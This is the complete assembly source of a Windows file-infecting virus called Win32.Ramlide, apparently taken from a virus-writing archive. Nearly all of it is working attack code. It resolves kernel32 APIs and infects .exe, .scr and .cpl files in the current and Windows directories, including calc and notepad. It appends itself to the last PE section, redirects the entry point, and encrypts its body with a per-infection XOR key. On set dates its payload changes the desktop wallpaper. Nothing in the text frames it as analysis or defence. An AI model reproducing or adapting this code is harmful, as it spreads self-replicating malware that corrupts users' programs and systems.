
; ---------------------------------------------------------------------------
;                           -< [Win32.Ramlide] >-
;                         == Designed by LiteSys ==
;
; One year without coding anything in ASM. I needed to code a simple virus
; so I could remember how to do those things... searches *.exe, *.cpl and
; *.scr files in the current directory, infects by appending at last section
; and has a payload that activates every 7th, 12th, 17th and 22th (drops
; a bitmap and sets it as wallpaper)... dedicated to my sweet girlfriend.
;
; Nothing else to say,
; LiteSys - (c) 2002
; ---------------------------------------------------------------------------

.586p
.MODEL FLAT, STDCALL
LOCALS

INCLUDE C:\TOOLS\TASM\INCLUDE\WIN32API.INC
INCLUDE C:\TOOLS\TASM\INCLUDE\WINDOWS.INC

OFS                             EQU     <OFFSET [EBP]>
BY                              EQU     <BYTE PTR [EBP]>
WO                              EQU     <WORD PTR [EBP]>
DWO                             EQU     <DWORD PTR [EBP]>
RDTSC                           EQU     <DW 310Fh>
APICALL        MACRO   APIz
  CALL DWORD PTR [APIz + EBP]
ENDM


EXTRN ExitProcess:PROC

.DATA
 DB "[Win32.Ramlide."
 DB (Fin_Ramlide - Ramlide) / 10000d MOD 10d + 30h
 DB (Fin_Ramlide - Ramlide) / 01000d MOD 10d + 30h
 DB (Fin_Ramlide - Ramlide) / 00100d MOD 10d + 30h
 DB (Fin_Ramlide - Ramlide) / 00010d MOD 10d + 30h
 DB (Fin_Ramlide - Ramlide) / 00001d MOD 10d + 30h
 DB "]", 00h

.CODE

Ramlide_:

LEA EDI, Codigo
MOV ECX, (Fin_Ramlide - Codigo)

@Cocos:

NOT BYTE PTR [EDI]
INC EDI

LOOP @Cocos

Ramlide:

CALL @Delta_Offset
@Delta_Offset: POP EBP
SUB EBP, (OFFSET @Delta_Offset)
LEA EDI, OFS [Codigo]
MOV ECX, (Fin_Ramlide - Codigo)

@Babas:

NOT BYTE PTR [EDI]
INC EDI

LOOP @Babas

JMP @Decryptor

Codigo:

PUSH EDX
MOV EDX, EBP
PUSH EBX

POP EBX        ; [
PUSH EDX       ; R
INC ECX        ; A
DEC EBP        ; M
DEC ESP        ; L
DEC ECX        ; I
INC ESP        ; D
INC EBP        ; E
POP EBP        ; ]

POP EDX

PUSH DWORD PTR [ESP]
POP EDI
AND EDI, 0FFFF0000h

CALL Seh_Frame

MOV ESP, [ESP+8h]
JMP @Retorno_Host

Seh_Frame:

XOR EAX, EAX
PUSH DWORD PTR FS:[EAX]
MOV FS:[EAX], ESP

PUSH 50h
POP ECX

@K32_Busca:

PUSH EDI
MOV AX, WORD PTR [EDI]
XOR AX, "ZM"
JZ @K32_Encontrado

POP EDI
SUB EDI, 1000h
LOOP @K32_Busca
JMP @Retorno_Host

@K32_Encontrado:

POP DWO [K32]
XCHG EDI, EBX
PUSH EBX
POP ESI

ADD ESI, [ESI+3Ch]
MOV ESI, [ESI+78h]
ADD ESI, EBX
PUSH ESI
POP DWO [Exports]

MOV ECX, [ESI+18h]
DEC ECX
PUSH ECX
POP EDX

MOV ESI, [ESI+20h]
ADD ESI, EBX

@GetP_Revisa:

MOV EDI, [ESI]
ADD EDI, EBX
XCHG ESI, EDI
LODSD
CMP EAX, "PteG"
JNZ @GetP_Loop
LODSD
CMP EAX, "Acor"
JNZ @GetP_Loop

XCHG ESI, EDI
SUB EDX, ECX
DEC ECX
ADD EDX, EDX

MOV EDI, DWO [Exports]
MOV ESI, [EDI+24h]

ADD ESI, EBX
ADD ESI, EDX

MOVZX EAX, WORD PTR [ESI]
IMUL EAX, EAX, 4h

MOV ESI, [EDI+1Ch]
ADD ESI, EBX
ADD ESI, EAX

MOV EAX, [ESI]
ADD EAX, EBX
MOV DWO [GetProcAddress], EAX
JMP @GetP_Fin

@GetP_Loop:

XCHG ESI, EDI
ADD ESI, 4h
LOOP @GetP_Revisa
JMP @Retorno_Host

@GetP_Fin:

LEA EDI, OFS [APIs_Texto]
LEA ESI, OFS [@ExitProcess]

@APIs_Loop:

PUSH EDI
PUSH EBX
APICALL GetProcAddress

MOV DWORD PTR [ESI], EAX
ADD ESI, 4h

XOR AL, AL
SCASB
JNZ $-1
CMP BYTE PTR [EDI], 0FFh
JNZ @APIs_Loop

LEA EDI, OFS [Busqueda]
PUSH EDI
CALL @SPE_1
DB "*.???", 00h
@SPE_1: APICALL FindFirstFileA
MOV DWO [SHandle], EAX

@SPE_Ciclo:

LEA ESI, OFS [@SPE_Segundo]
PUSH ESI

LEA EDI, OFS [Busqueda.wfd_szFileName]
PUSH EDI
POP EBX
MOV AL, "."
SCASB
JNZ $-1
DEC EDI
PUSH DWORD PTR [EDI]
POP EAX
OR EAX, 20202020h
CMP EAX, "exe."
JZ @PE_Infectar
CMP EAX, "rcs."
JZ @PE_Infectar
CMP EAX, "lpc."
JZ @PE_Infectar

POP EDX

@SPE_Segundo:

LEA EDI, OFS [Busqueda]
PUSH EDI
PUSH DWO [SHandle]
APICALL FindNextFile
OR EAX, EAX
JNZ @SPE_Ciclo

PUSH DWO [SHandle]
APICALL FindClose

@SPE_Fin:

LEA EDI, OFS [CurDir]
PUSH EDI
PUSH MAX_PATH
APICALL GetCurrentDirectoryA

LEA EDI, OFS [Busqueda.wfd_szFileName]
PUSH MAX_PATH
PUSH EDI
APICALL GetWindowsDirectoryA

PUSH EDI
APICALL SetCurrentDirectoryA

CALL @@1
DB "CALC.EXE", 00h
@@1: POP EBX
CALL @PE_Infectar
CALL @@2
DB "NOTEPAD.EXE", 00h
@@2: POP EBX
CALL @PE_Infectar
CALL @@3
DB "CDPLAYER.EXE", 00h
@@3: POP EBX
CALL @PE_Infectar
CALL @@4
DB "WRITE.EXE", 00h
@@4: POP EBX
CALL @PE_Infectar
CALL @@5
DB "PBRUSH.EXE", 00h
@@5: POP EBX
CALL @PE_Infectar

CALL @Payload

LEA EDI, OFS [CurDir]
PUSH EDI
APICALL SetCurrentDirectoryA

@Retorno_Host:

XOR EDX, EDX
POP DWORD PTR FS:[EDX]
POP EDX

PUSH 12345678h
ORG $-4
Retorno                         DD      OFFSET Fin_Ramlide
RET

@Payload:

CALL @@Z
DateConFuria                    DB      10h DUP (00h)
@@Z: APICALL GetSystemTime

LEA ESI, OFS [DateConFuria+6]
LODSW
CMP AL, 7d
JZ @Bufaliroooooooooooooo
CMP AL, 12d
JZ @Bufaliroooooooooooooo
CMP AL, 17d
JZ @Bufaliroooooooooooooo
CMP AL, 22d
JZ @Bufaliroooooooooooooo

RET

@Bufaliroooooooooooooo:

CALL @@X
DB "USER32", 00h
@@X: APICALL LoadLibraryA
OR EAX, EAX
JZ @EndBufi

CALL @@Y
DB "SystemParametersInfoA", 00h
@@Y: PUSH EAX
APICALL GetProcAddress
MOV DWO [SystemParametersInfo], EAX
OR EAX, EAX
JZ @EndBufi

XOR EBX, EBX
PUSH EBX
PUSH FILE_ATTRIBUTE_NORMAL
PUSH CREATE_ALWAYS
PUSH EBX
PUSH EBX
PUSH GENERIC_READ + GENERIC_WRITE
CALL @@W
bemepe DB "ramlide.bmp", 00h
@@W: APICALL CreateFileA
MOV DWO [FHandle], EAX
INC EAX
JZ @EndBufi
DEC EAX

XOR EBX, EBX
PUSH EBX
PUSH 65536d
PUSH EBX
PUSH PAGE_READWRITE
PUSH EBX
PUSH EAX
APICALL CreateFileMappingA
MOV DWO [MHandle], EAX
OR EAX, EAX
JZ @EndBufi

PUSH 65536d
PUSH EBX
PUSH EBX
PUSH FILE_MAP_READ + FILE_MAP_WRITE
PUSH EAX
APICALL MapViewOfFile
MOV DWO [BaseMap], EAX
OR EAX, EAX
JZ @EndBufi

PUSH EAX
LEA EAX, OFS [@BitMap]
PUSH EAX
CALL _aP_depack_asm

POP EDX
POP EDX

XOR EBX, EBX
PUSH EBX
PUSH EBX
PUSH EAX
PUSH DWO [FHandle]
APICALL SetFilePointer

PUSH DWO [BaseMap]
APICALL UnmapViewOfFile

PUSH DWO [MHandle]
APICALL CloseHandle

PUSH DWO [FHandle]
APICALL SetEndOfFile

PUSH DWO [FHandle]
APICALL CloseHandle

PUSH 1
LEA EDI, OFS [bemepe]
PUSH EDI
PUSH NULL
PUSH 20d
APICALL SystemParametersInfo

PUSH 0
APICALL @ExitProcess

@EndBufi:

RET

@PE_Infectar:

PUSH NULL
PUSH EBX
APICALL SetFileAttributesA

XOR EAX, EAX
PUSH EAX
PUSH FILE_ATTRIBUTE_NORMAL
PUSH OPEN_EXISTING
PUSH EAX
PUSH EAX
PUSH GENERIC_READ + GENERIC_WRITE
PUSH EBX
APICALL CreateFileA
MOV DWO [FHandle], EAX
INC EAX
JZ @PE_FinCFA
DEC EAX

PUSH NULL
PUSH EAX
APICALL GetFileSize
MOV DWO [FSize], EAX

ADD EAX, (Fin_Ramlide - Ramlide) + 1000h        ; 4096d
MOV DWO [FSizeNew], EAX

XOR EBX, EBX
PUSH EBX
PUSH EAX
PUSH EBX
PUSH PAGE_READWRITE
PUSH EBX
PUSH DWO [FHandle]
APICALL CreateFileMappingA
MOV DWO [MHandle], EAX
OR EAX, EAX
JZ @PE_CloseFHandle

XOR EBX, EBX
PUSH DWO [FSizeNew]
PUSH EBX
PUSH EBX
PUSH FILE_MAP_WRITE
PUSH EAX
APICALL MapViewOfFile
MOV DWO [BaseMap], EAX
OR EAX, EAX
JZ @PE_CloseMHandle

; .. W0RK H3R3 ..

MOV EDI, EAX
MOV AX, WORD PTR [EDI]
XOR AX, "ZM"
JNZ @PE_UnmapView

ADD EDI, [EDI+3Ch]
MOV AX, WORD PTR [EDI]
XOR AX, "EP"
JNZ @PE_UnmapView

MOV EAX, DWORD PTR [EDI+4Ch]
XOR EAX, "LiDE"
JZ @PE_UnmapView

MOV DWORD PTR [EDI+4Ch], "LiDE"

MOVZX EAX, WORD PTR [EDI+14h]
ADD EAX, 18h
PUSH EDI
POP ESI
ADD ESI, EAX

MOVZX EBX, WORD PTR [EDI+06h]
DEC EBX
IMUL EBX, EBX, 28h
ADD ESI, EBX

OR DWORD PTR [ESI+24h], 0A0000020h

MOV EAX, DWORD PTR [ESI+08h]
PUSH EAX
ADD EAX, (Fin_Ramlide - Ramlide)
MOV DWORD PTR [ESI+08h], EAX

MOV EBX, DWORD PTR [EDI+3Ch]
XOR EDX, EDX
DIV EBX
INC EAX
MUL EBX

MOV DWORD PTR [ESI+10h], EAX
ADD EAX, DWORD PTR [ESI+0Ch]
MOV DWORD PTR [EDI+50h], EAX

POP EDX

PUSH DWO [Retorno]

MOV EAX, DWORD PTR [EDI+28h]
ADD EAX, DWORD PTR [EDI+34h]
MOV DWO [Retorno], EAX

ADD EDX, DWORD PTR [ESI+0Ch]
MOV DWORD PTR [EDI+28h], EDX

MOV EDI, DWORD PTR [ESI+14h]
ADD EDI, DWORD PTR [ESI+08h]
ADD EDI, DWO [BaseMap]
PUSH (Fin_Ramlide - Ramlide)
POP ECX
SUB EDI, ECX

PUSH EDI

MOV EDI, ESP
SUB EDI, (Fin_Ramlide - Ramlide) + 200h
PUSH EDI
LEA ESI, OFS [Codigo]

RDTSC
MOV DWO [Llave], EAX
NOT EDX
MOV DWO [Llave_Add], EDX

MOV ECX, (Fin_Encriptado - Codigo) / 4

@Rapu:

MOVSD
XOR DWORD PTR [EDI-4h], EAX
ADD EAX, EDX

LOOP @Rapu

MOV ECX, (Fin_Ramlide - @Decryptor)
REP MOVSB

POP EDI
PUSH EDI

MOV ECX, (Fin_Ramlide - Codigo)

@Rapu2:

NOT BYTE PTR [EDI]
INC EDI

LOOP @Rapu2

POP EBX
POP EDI

LEA ESI, OFS [Ramlide]
MOV ECX, (Codigo - Ramlide)
REP MOVSB

XCHG ESI, EBX

MOV ECX, (Fin_Ramlide - Codigo)
REP MOVSB

POP DWO [Retorno]

PUSH DWO [FSizeNew]
POP DWO [FSize]

@PE_UnmapView:

PUSH DWO [BaseMap]
APICALL UnmapViewOfFile

@PE_CloseMHandle:

PUSH DWO [MHandle]
APICALL CloseHandle

@PE_CloseFHandle:

XOR EAX, EAX
PUSH EAX
PUSH EAX
PUSH DWO [FSize]
PUSH DWO [FHandle]
APICALL SetFilePointer

PUSH DWO [FHandle]
APICALL SetEndOfFile

PUSH DWO [FHandle]
APICALL CloseHandle

@PE_FinCFA:

RET


;;; aplib

_aP_depack_asm:
    push   ebp
    mov    ebp, esp
    pushad
    push   ebp

    mov    esi, [ebp + 8]     ; C calling convention
    mov    edi, [ebp + 12]

    cld
    mov    dl, 80h

literal:
    movsb
nexttag:
    call   getbit
    jnc    literal

    xor    ecx, ecx
    call   getbit
    jnc    codepair
    xor    eax, eax
    call   getbit
    jnc    shortmatch
    mov    al, 10h
getmorebits:
    call   getbit
    adc    al, al
    jnc    getmorebits
    jnz    domatch_with_inc
    stosb
    jmp    short nexttag
codepair:
    call   getgamma_no_ecx
    dec    ecx
    loop   normalcodepair
    mov    eax,ebp
    call   getgamma
    jmp    short domatch

shortmatch:
    lodsb
    shr    eax, 1
    jz     donedepacking
    adc    ecx, 2
    mov    ebp, eax
    jmp    short domatch

normalcodepair:
    xchg   eax, ecx
    dec    eax
    shl    eax, 8
    lodsb
    mov    ebp, eax
    call   getgamma
    cmp    eax, 32000
    jae    domatch_with_2inc
    cmp    eax, 1280
    jae    domatch_with_inc
    cmp    eax, 7fh
    ja     domatch

domatch_with_2inc:
    inc    ecx

domatch_with_inc:
    inc    ecx
domatch:
    push   esi
    mov    esi, edi
    sub    esi, eax
    rep    movsb
    pop    esi
    jmp    short nexttag

getbit:
    add     dl, dl
    jnz     stillbitsleft
    mov     dl, [esi]
    inc     esi
    adc     dl, dl
stillbitsleft:
    ret

getgamma:
    xor    ecx, ecx
getgamma_no_ecx:
    inc    ecx
getgammaloop:
    call   getbit
    adc    ecx, ecx
    call   getbit
    jc     getgammaloop
    ret

donedepacking:
    pop    ebp
    sub    edi, [ebp + 12]
    mov    [ebp - 4], edi     ; return unpacked length in eax

    popad
    pop    ebp
    ret


;     ----
; -=< DATA >=-
;     ----

DB 'Ramlide -- Dedicado a  E.R...'

K32                             DD      00000000h
Exports                         DD      00000000h
GetProcAddress                  DD      00000000h
SHandle                         DD      00000000h
FHandle                         DD      00000000h
MHandle                         DD      00000000h
BaseMap                         DD      00000000h
FSize                           DD      00000000h
FSizeNew                        DD      00000000h
SystemParametersInfo            DD      00000000h

@ExitProcess                    DD      00000000h
CreateFileA                     DD      00000000h
CreateFileMappingA              DD      00000000h
MapViewOfFile                   DD      00000000h
UnmapViewOfFile                 DD      00000000h
SetFilePointer                  DD      00000000h
SetEndOfFile                    DD      00000000h
CloseHandle                     DD      00000000h
FindFirstFileA                  DD      00000000h
FindNextFile                    DD      00000000h
FindClose                       DD      00000000h
SetFileAttributesA              DD      00000000h
GetFileSize                     DD      00000000h
GetWindowsDirectoryA            DD      00000000h
SetCurrentDirectoryA            DD      00000000h
GetCurrentDirectoryA            DD      00000000h
GetSystemTime                   DD      00000000h
LoadLibraryA                    DD      00000000h

APIs_Texto                      DB      "ExitProcess", 00h
                                DB      "CreateFileA", 00h
                                DB      "CreateFileMappingA", 00h
                                DB      "MapViewOfFile", 00h
                                DB      "UnmapViewOfFile", 00h
                                DB      "SetFilePointer", 00h
                                DB      "SetEndOfFile", 00h
                                DB      "CloseHandle", 00h
                                DB      "FindFirstFileA", 00h
                                DB      "FindNextFileA", 00h
                                DB      "FindClose", 00h
                                DB      "SetFileAttributesA", 00h
                                DB      "GetFileSize", 00h
                                DB      "GetWindowsDirectoryA", 00h
                                DB      "SetCurrentDirectoryA", 00h
                                DB      "GetCurrentDirectoryA", 00h
                                DB      "GetSystemTime", 00h
                                DB      "LoadLibraryA", 00h
                                DB      0FFh

INCLUDE BITMAP.ASM

DB 0FFh, 0FFh, "==< Win32.Ramlide (c) 2002 by LiteSys >==", 0FFh, 0FFh

Busqueda                        DB      SIZEOF_WIN32_FIND_DATA DUP (00h)
CurDir                          DB      MAX_PATH DUP (00h)

DB "[Win32.Ramlide."
DB (Fin_Ramlide - Ramlide) / 10000d MOD 10d + 30h
DB (Fin_Ramlide - Ramlide) / 01000d MOD 10d + 30h
DB (Fin_Ramlide - Ramlide) / 00100d MOD 10d + 30h
DB (Fin_Ramlide - Ramlide) / 00010d MOD 10d + 30h
DB (Fin_Ramlide - Ramlide) / 00001d MOD 10d + 30h
DB "]", 00h

ALIGN DWORD

Fin_Encriptado:

@Decryptor:

LEA EDI, OFS [Codigo]
MOV ECX, (Fin_Encriptado - Codigo) / 4
MOV EAX, 12345678h
ORG $-4
Llave                           DD      00000000h

@Decrypt:

XOR DWORD PTR [EDI], EAX
ADD EAX, 12345678h
ORG $-4
Llave_Add                       DD      00000000h
ADD EDI, 4h

LOOP @Decrypt

JMP Codigo

ALIGN DWORD

Fin_Ramlide:

PUSH NULL
CALL ExitProcess

End Ramlide_

                                                      t o d o
                               .----------------.       g i r a
                          .----"----------.     |         e n  t o r n o
                 .--------"-------.       |     |
                 |    $$$$$$$$    |$$     |     |     a  l a s  c a r t a s
                 |   $$      $$   |$$     |     |        d e l  a z a r
                 |           $$   |$$     |     |
                 |         $$     |$$     |     |
                 |       $$       |$$     |     |
                 |       $$       |$$     |     |   y  e l  i n c o g n i t o
                 |       $$       |$$     |     |                  . . .
                 |       $$       |       |     |
                 |                |$$     |-----'         ! L i T E +
                 |       $$       |-------'
                 `----------------'
Back to index
